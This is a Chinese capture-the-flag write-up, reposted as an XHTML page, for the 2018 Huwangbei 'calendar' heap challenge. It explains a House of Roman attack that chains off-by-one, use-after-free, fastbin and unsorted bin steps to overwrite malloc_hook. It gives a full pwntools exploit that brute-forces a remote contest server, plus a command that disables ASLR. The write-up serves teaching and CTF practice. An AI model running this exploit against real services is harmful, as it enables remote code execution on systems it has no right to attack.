@@ -1,0 +1,158 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>2018护网杯calendar详析</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>2018护网杯calendar详析</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247484696&amp;idx=4&amp;sn=770edaa6f39243d16a9a452de9b9d99e&amp;chksm=fa3945c2cd4eccd42d76a98fa36ce2f3044c3cec79bda3260dbf091a0f750250de234fe73730&amp;scene=126&amp;sessionid=1681376493#rd">http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247484696&amp;idx=4&amp;sn=770edaa6f39243d16a9a452de9b9d99e&amp;chksm=fa3945c2cd4eccd42d76a98fa36ce2f3044c3cec79bda3260dbf091a0f750250de234fe73730&amp;scene=126&amp;sessionid=1681376493#rd</a></blockquote><section style="background-color: rgb(255, 255, 255);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin-right: 0%;margin-bottom: 10px;margin-left: 0%;box-sizing: border-box;"><section class="" style="display: inline-block;width: 100%;vertical-align: top;border-style: solid;border-width: 2px;border-radius: 0px;border-color: rgb(80, 162, 238);padding: 15px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="box-sizing: border-box;"><section class="" style="font-size: 15px;color: rgb(40, 40, 40);text-align: center;box-sizing: border-box;"><p style="box-sizing: border-box;"><span style="font-size: 14px;">更多全球网络安全资讯尽在邑安全</span></p><p style="box-sizing: border-box;"><span style="box-sizing: border-box;font-size: 14px;">www.eansec.com</span></p></section></section></section></section></section></section></section><section style="background-color: rgb(255, 255, 255);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" powered-by="xiumi.us"><section class="" style="margin-top: 10px;margin-bottom: 10px;box-sizing: border-box;"><br/></section><p style="box-sizing: border-box;margin-bottom: 1rem;"><img class="alignnone size-full wp-image-162377 aligncenter" data-ratio="0.5" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEqQT0n60wWGBia4qgNK88icwImrCT5U2aAzJ6kSzpqtcXjYDA0VibVpbvQ/640?wx_fmt=jpeg" data-type="jpeg" data-w="940" height="470" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 12px 0px;top: 0px;left: 0px;right: 0px;bottom: 0px;" width="940" src="../Images/b65cc89052b523517ef6b60e87516c37.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEqQT0n60wWGBia4qgNK88icwImrCT5U2aAzJ6kSzpqtcXjYDA0VibVpbvQ/640?wx_fmt=jpeg"/></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;"> </span></p><h2 name="h2-0" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: inherit;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 22px;"><span style="font-size: 14px;">前言</span></h2><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">护网杯结束也有一段时间了（被虐惨了。。），各位大佬战队的WP也相继出炉，不过部分题目的WP不够详细，对于刚入门的萌新来说可能会有点难看懂。今天有空就来写下pwn题calendar的wp，也刚好做个笔记吧(轻喷)。讲到这题，很遗憾，我是赛后才复现出来的，因为当时有各种细节没处理好，而且远程爆破也是讲究玄学的，这也许就是这道题目值800分所在吧。</span></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;"> </span></p><h2 name="h2-1" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: inherit;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 22px;"><span style="font-size: 14px;">解题思路</span></h2><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">其实这题最坑的就是没办法泄露出libc，要利用house of Roman爆破12 bit来getshell。首先fastbin attack使得malloc hook可以任意写，修复fastbin后利用unsorted bin attack使malloc hook指向main_arena+88的地方，最后利用uaf部分地址写把one_gadget的低三字节写入malloc hook，本地调试的时候可以把ASLR关了，接着就剩玄学的远程爆破了。</span></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;"> </span></p><h2 name="h2-2" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: inherit;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 22px;"><span style="font-size: 14px;">解题步骤</span></h2><h3 name="h3-3" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: inherit;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 19px;"><span style="font-size: 14px;">1、先简单运行一下程序，查看保护。</span></h3><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">这里主要开启了canary和nx保护，不能改写got表</span></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.4631578947368421" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEJdfMVahD9TNGB4VcyjLZzUMIYVbknxREgpnDn59c6dQzSG5aCdlYJA/640?wx_fmt=png" data-type="png" data-w="475" style="" src="../Images/c36c8c1a7fb2535dac63f97a3779ce98.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEJdfMVahD9TNGB4VcyjLZzUMIYVbknxREgpnDn59c6dQzSG5aCdlYJA/640?wx_fmt=png"/></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.3510971786833856" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEl1nMcIRQiboxdNgYwYBjym415SK8O9HtVqiaXFrnODbIXFdXMWiaDYibvw/640?wx_fmt=png" data-type="png" data-w="319" style="" src="../Images/6f82abee3d7b90e222bc36e610e308b2.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEl1nMcIRQiboxdNgYwYBjym415SK8O9HtVqiaXFrnODbIXFdXMWiaDYibvw/640?wx_fmt=png"/></p><p style="text-align: center;"><span style="font-size: 14px;color: rgba(0, 0, 0, 0.85);font-family: inherit;"><br/></span></p><p><span style="font-size: 14px;">2、ida打开，反编译。</span></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">1、这里主要有add()，edit()和remove()函数，并没有可以泄露的show()函数</span></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.7154308617234469" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEAeuCvhKZGSYJRFD3yvZJkPquBov2XbYPepx4yDeyTL6QMLoiczfoLtA/640?wx_fmt=png" data-type="png" data-w="499" style="" src="../Images/2a5da6674b1fd7b46c1854a6b4591016.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEAeuCvhKZGSYJRFD3yvZJkPquBov2XbYPepx4yDeyTL6QMLoiczfoLtA/640?wx_fmt=png"/></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">2、edit()里面有个offbyone漏洞，还有一个关键的地方就是，可以edit空闲的chunk</span></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.6133333333333333" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEIiaMXHFOLEAGicESiaRrMe4LQwAz1OtVRZibCKMeAWypMlZd3nzVWYb9NA/640?wx_fmt=png" data-type="png" data-w="450" style="" src="../Images/58c99b4905b8c78c38490497004fbb4f.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEIiaMXHFOLEAGicESiaRrMe4LQwAz1OtVRZibCKMeAWypMlZd3nzVWYb9NA/640?wx_fmt=png"/></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">3、remove()里面free后没有置0，有个uaf漏洞</span></p><p style="text-align: center;"><img data-copyright="0" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEenLNLGfIT6AQ3TlZLK5Of7jibBsSw7gibYQ92cE5HYRW1tnfYqLZ3Pjw/640?wx_fmt=png" data-type="png" style="" class="" data-ratio="0.6077586206896551" data-w="232" src="../Images/8c9877a48a9aaef67c25b3de483bc524.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEenLNLGfIT6AQ3TlZLK5Of7jibBsSw7gibYQ92cE5HYRW1tnfYqLZ3Pjw/640?wx_fmt=png"/></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;color: rgba(0, 0, 0, 0.85);font-family: inherit;"><br/></span></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="color: rgba(0, 0, 0, 0.85);font-family: inherit;font-size: 14px;">3、本地调试</span></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">1、先把堆栈随机化关了</span></p><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></pre><p><img class="" data-copyright="0" data-ratio="0.047683923705722074" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEnY1J64hPtVu9PERBiaAXlicEK1tOky6z0hRAkicj7ZtqhibP060bD7wtDw/640?wx_fmt=png" data-type="png" data-w="734" style="" src="../Images/1d12bb9800613b0f8b835de613efc931.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEnY1J64hPtVu9PERBiaAXlicEK1tOky6z0hRAkicj7ZtqhibP060bD7wtDw/640?wx_fmt=png"/><span style="font-size: 14px;">2、找出libc和它的基地址</span></p><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">p.recvuntil('input calendar name&gt; ')
+
+p.sendline('123')
+add(1,0x68)
+gdb.attach(p)</span></pre><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">malloc hook地址为0x7ffff7dd1b10 ，所以基地址为0x7ffff7a0d000</span></p><p style="text-align: center;"><img data-copyright="0" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEchGYN14YGXoOFHGMfLz2RddwNnOLSckuTscjo89Q4YKqmlaUVxALJg/640?wx_fmt=png" data-type="png" style="" class="" data-ratio="0.4307692307692308" data-w="715" src="../Images/3ed963e5c3f7795201060cf00b7fdebf.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEchGYN14YGXoOFHGMfLz2RddwNnOLSckuTscjo89Q4YKqmlaUVxALJg/640?wx_fmt=png"/></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;color: rgba(0, 0, 0, 0.85);font-family: inherit;"><br/></span></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="color: rgba(0, 0, 0, 0.85);font-family: inherit;font-size: 14px;">4、fastbin attack</span></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">1、因为没有show()，所以只能利用uaf改fastbin chunk的fd指针。先申请3个0x70，由于add()里只能输入最大是0x68，所以利用edit的offbyone漏洞改chunk2的size，然后再free进入unsorted bin。</span></p><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">add(1,0x68)
+#gdb.attach(p)
+add(2,0x68)
+add(3,0x60)
+edit(3,0x60,p64(0)*2+p64(0x90)+p64(0x51)+'n')
+edit(1,0x68,'a'*0x68+chr(0x91))
+
+dele(2)</span><img class="" data-copyright="0" data-ratio="0.41426611796982166" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeE1eyLVicZYyauuicqMnVaAy12Hv5TkT6PuQHZBNcIvtgEZZic93mQsZwRg/640?wx_fmt=png" data-type="png" data-w="729" style="text-align: center;background-color: rgb(255, 255, 255);font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;" src="../Images/9d84de9624da75fc5e0646470feb2571.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeE1eyLVicZYyauuicqMnVaAy12Hv5TkT6PuQHZBNcIvtgEZZic93mQsZwRg/640?wx_fmt=png"/></pre><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">2、edit把size改回，再free两个chunk，利用edit和UAF部分写改chunk3的fd为上面free掉的unsorted bin中的chunk2，这样fastbin—&gt;chunk3—&gt;chunk2—&gt;main_arena+88，接着把chunk2的fd改成malloc hook-0x13。</span></p><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">edit(1,0x68,'a'*0x68+chr(0x71))
+dele(1)
+dele(3)
+edit(3,1,chr(0x70)+chr(0x70))
+
+edit(2,1,chr(0xfd)+chr(0x1a))</span></pre><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.3192261185006046" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEibP15LFTlpTcFW3ZMxuibTUVibUpUBbibF9KCGT87NutrYC2cISuhXAfhw/640?wx_fmt=png" data-type="png" data-w="827" style="" src="../Images/e416e6fa9be4f1fd312d78fd0210feb9.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEibP15LFTlpTcFW3ZMxuibTUVibUpUBbibF9KCGT87NutrYC2cISuhXAfhw/640?wx_fmt=png"/><span style="font-size: 14px;">3、申请3个块，chunk3就被分配到了malloc hook-0x13的地方，到时候把malloc hook改成one_gadget就行，接着free掉chunk4进入fastbin，edit把它的fd指针改成0，修复fastbin（如果不修复无法进行下面的unsorted bin attack）</span></p><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">add(1,0x60)
+add(4,0x60)
+add(3,0x60)
+dele(4)
+edit(4,7,p64(0))</span><img class="" data-copyright="0" data-ratio="0.45737483085250336" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEEwW7zvejLTqeibMv95P24ON3ViczicjlISmsLCltXCxYcLa5l3raHyWqA/640?wx_fmt=png" data-type="png" data-w="739" style="text-align: center;background-color: rgb(255, 255, 255);font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;" src="../Images/510380cd60353859d5e07dda9ce64bd8.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEEwW7zvejLTqeibMv95P24ON3ViczicjlISmsLCltXCxYcLa5l3raHyWqA/640?wx_fmt=png"/></pre><h3 name="h3-7" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: inherit;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 19px;"><span style="font-size: 14px;">5、unsorted bin attack</span></h3><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">由上面的图可以看出，fastbin和unsorted bin都指向同一个块，这时我们就可以申请chunk1就可以改unsorted bin的bk指针为malloc hook-0x10，再申请一个0x60的时候块的时候malloc hook就会指向main_arena+88</span></p><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">add(1,0x60)        
+edit(1,9,p64(0)+chr(0x00)+chr(0x1b))    
+add(1,0x60)</span><img class="" data-copyright="0" data-ratio="0.2196765498652291" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeExtUPSw1PiaobkGvVgnmOoX0IxpV7nYVWB5zNdSYN00ibW4H1XAV1mmAQ/640?wx_fmt=png" data-type="png" data-w="742" style="text-align: center;background-color: rgb(255, 255, 255);font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;" src="../Images/d0155d61f6aeb4e6e174f20a5512d8d4.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeExtUPSw1PiaobkGvVgnmOoX0IxpV7nYVWB5zNdSYN00ibW4H1XAV1mmAQ/640?wx_fmt=png"/></pre><h3 name="h3-8" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: inherit;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 19px;"><span style="font-size: 14px;">6、改malloc hook为one_gadget</span></h3><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">这时候我们edit chunk3就可以改malloc hook的低3字节为one_gadget，有些one_gadget会失败，这时选一个合适的one_gadget就行。</span></p><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">one=0xf66f0
+#one = 0xcd0f3
+#one = 0x4526a
+#one = 0xf02a4
+one_gadget =libcbase+one
+edit(3,5,'aaa'+p64(one_gadget)[0:3])</span><img class="" data-copyright="0" data-ratio="0.17842323651452283" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEYrIGL00TxUKTj3EMGjnZPe34kWWzicwTVTLRvDcq2ppuo50VvcPWKiaQ/640?wx_fmt=png" data-type="png" data-w="723" style="text-align: center;background-color: rgb(255, 255, 255);font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;" src="../Images/4e736ed92613812386fdc0f600cd16ea.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEYrIGL00TxUKTj3EMGjnZPe34kWWzicwTVTLRvDcq2ppuo50VvcPWKiaQ/640?wx_fmt=png"/></pre><h3 name="h3-9" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: inherit;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 19px;"><span style="font-size: 14px;">7、触发one_gadget</span></h3><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">free掉同一个chunk由于double free会报错，这时会调用malloc hook触发one_gadget</span></p><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">dele(4)
+dele(4)</span><img class="" data-copyright="0" data-ratio="0.39373297002724794" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEE5xAMEY1rAlNPIqsoz8CXPsj0WkpNf1VwkOLeb9tLaujHcr9z1fiabA/640?wx_fmt=png" data-type="png" data-w="734" style="text-align: center;background-color: rgb(255, 255, 255);font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;" src="../Images/d2b24123be17f1787d4895307e70a9c4.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8tFmxdIEOSLwM02uxE1TibeEE5xAMEY1rAlNPIqsoz8CXPsj0WkpNf1VwkOLeb9tLaujHcr9z1fiabA/640?wx_fmt=png"/></pre><h3 name="h3-10" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: inherit;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 19px;"><span style="font-size: 14px;">8、远程爆破</span></h3><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">这时候再写个远程爆破的脚本就可以进行远程爆破。</span></p><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">for i in range(10000):
+    #p=process('./task_calendar')
+    p = remote('117.78.40.144', 31274)
+    try:
+        exp()
+
+        break;
+    except:
+        print i
+
+p.interactive()</span></pre><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;"> </span></p><h2 name="h2-11" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: inherit;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 22px;"><span style="font-size: 14px;">小结（心得体会）</span></h2><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;">做题目不仅要会做，而且要细心审代码，当时我做这题的时候就是因为不够细心，那个offbyone漏洞一开始我竟然没注意。。所以做不出来，后面他提示了house of Roman后我重新审代码才发现的。总之好好学吧，成为大佬还有很长的路要走。。</span></p><p style="box-sizing: border-box;margin-bottom: 1rem;"><span style="font-size: 14px;"> </span></p><h2 name="h2-12" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: inherit;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 22px;"><span style="font-size: 14px;">完整exp</span></h2><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">from pwn import*
+
+context(arch="amd64",os="linux" ,endian = 'little')
+
+elf=ELF('task_calendar')
+libc=ELF('libc6_2.23-0ubuntu10_amd64.so')
+def add(id,leng):
+    p.recvuntil('choice&gt; ')
+    p.sendline('1')
+    p.recvuntil('choice&gt; ')
+    p.sendline(str(id))
+    p.recvuntil('size&gt; ')
+    p.sendline(str(leng))
+
+
+
+def edit(id,size,x):
+    p.recvuntil('choice&gt; ')
+    p.sendline('2')
+    p.recvuntil('choice&gt; ')
+    p.sendline(str(id))
+    p.recvuntil('size&gt; ')
+    p.sendline(str(size))
+    p.recvuntil('info&gt; ')
+    p.send(x)
+
+def dele(id):
+    p.recvuntil('choice&gt; ')
+    p.sendline('3')
+    p.recvuntil('choice&gt; ')
+    p.sendline(str(id))
+
+def exp():
+
+
+    p.recvuntil('input calendar name&gt; ')
+
+    p.sendline('123')
+    #print hex(libc.symbols['__malloc_hook'])
+    libcbase=0x7ffff7a0d000
+    #########fastbin attack###########
+    add(1,0x68)
+    #gdb.attach(p)
+    add(2,0x68)
+    add(3,0x60)
+    edit(3,0x60,p64(0)*2+p64(0x90)+p64(0x51)+'n')
+
+
+    edit(1,0x68,'a'*0x68+chr(0x91))
+
+    dele(2)
+
+    edit(1,0x68,'a'*0x68+chr(0x71))
+    dele(1)
+    dele(3)
+    edit(3,1,chr(0x70)+chr(0x70))
+
+    edit(2,1,chr(0xfd)+chr(0x1a))
+    #gdb.attach(p)
+    add(1,0x60)
+    #
+    add(4,0x60)
+
+    add(3,0x60)
+    dele(4)
+    edit(4,7,p64(0))
+    #####unsorted bin attack##########
+    add(1,0x60)
+
+    edit(1,9,p64(0)+chr(0x00)+chr(0x1b))
+
+    add(1,0x60)
+
+
+
+    one=0xf66f0
+    #one = 0xcd0f3
+    #one = 0x4526a
+    #one = 0xf02a4
+    one_gadget =libcbase+one
+    edit(3,5,'aaa'+p64(one_gadget)[0:3])
+
+    #add(3,0x60)
+
+    dele(4)
+    dele(4)
+
+
+    #p.sendline('cat haixiao.txt')
+    p.sendline('cat flag')
+
+
+
+for i in range(10000):
+    #p=process('./task_calendar')
+    p = remote('117.78.40.144', 31274)
+    try:
+        exp()
+
+
+        break;
+
+    except:
+        print i
+
+p.interactive()</span></pre><section class="article-footer-label"><span style="font-size: 14px;">转自安全客</span></section><section class="" style="margin-top: 10px;margin-bottom: 10px;box-sizing: border-box;text-align: center;"><span style="color: rgb(80, 162, 238);font-size: 14px;">欢迎收藏并分享朋友圈，让五邑人网络更安全<br/></span></section><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.9955357142857143" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/1N39PtINn8tD9ic928O6vIrMg4fuib48e1TsRj9K9Cz7RZBD2jjVZcKm1N4QrZ4bwBKZic5crOdItOcdDicPd3yBSg/640?wx_fmt=jpeg" data-type="jpeg" data-w="224" style="width: 157px;height: 156px;" src="../Images/f991b2ae7d17500c856a541522a74428.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/1N39PtINn8tD9ic928O6vIrMg4fuib48e1TsRj9K9Cz7RZBD2jjVZcKm1N4QrZ4bwBKZic5crOdItOcdDicPd3yBSg/640?wx_fmt=jpeg"/></p><section class="" style="margin-top: 10px;margin-bottom: 10px;box-sizing: border-box;text-align: center;"><span style="font-size: 14px;color: rgb(80, 162, 238);">欢迎扫描关注我们，及时了解最新安全动态、学习最潮流的安全姿势！<br/></span></section><section style="background-color: rgb(255, 255, 255);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin-top: 0.5em;box-sizing: border-box;"><section class="" style="height: 1px;background-color: rgb(95, 156, 239);box-sizing: border-box;"/><section class="" style="margin-top: 0.3em;margin-bottom: 0.3em;height: 3px;background-color: rgb(95, 156, 239);box-sizing: border-box;"/><section class="" style="border-width: 1px;border-style: solid;box-shadow: rgb(226, 226, 226) 0px 16px 1px -13px;border-color: rgb(95, 156, 239);padding: 0.5em;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 10px 0%;box-sizing: border-box;"><section class="" style="display: inline-block;width: 100%;vertical-align: top;background-color: rgb(247, 247, 247);padding-top: 10px;padding-bottom: 10px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin-right: 0%;margin-bottom: 10px;margin-left: 0%;box-sizing: border-box;"><section class="" style="display: inline-block;width: 100%;border-style: solid;border-width: 0px 0px 0px 6px;padding-right: 6px;padding-left: 6px;border-left: 6px solid rgb(80, 162, 238);border-right: 0px solid rgb(80, 162, 238);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="box-sizing: border-box;"><section class="" style="box-sizing: border-box;"><p style="box-sizing: border-box;"><span style="font-size: 14px;">推荐文章</span></p></section></section></section></section></section></section><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="text-align: center;box-sizing: border-box;"><section class="" style="display: inline-table;border-collapse: collapse;table-layout: fixed;width: 95%;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="display: table-row-group;box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="display: table-row;width: 100%;box-sizing: border-box;"><section class="" style="display: table-cell;vertical-align: top;width: 10%;border-width: 1px;border-radius: 0px;border-style: none;border-color: rgb(62, 62, 62);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 6px 0%;font-size: 8px;box-sizing: border-box;"><section class="" style="display: inline-block;border-width: 2px;border-style: dotted;border-color: rgba(248, 248, 248, 0);width: 1.6em;height: 1.6em;border-radius: 0.3em;font-size: 12px;line-height: 1.5em;color: rgb(255, 255, 255);background-color: rgb(95, 156, 239);box-sizing: border-box;"><p style="box-sizing: 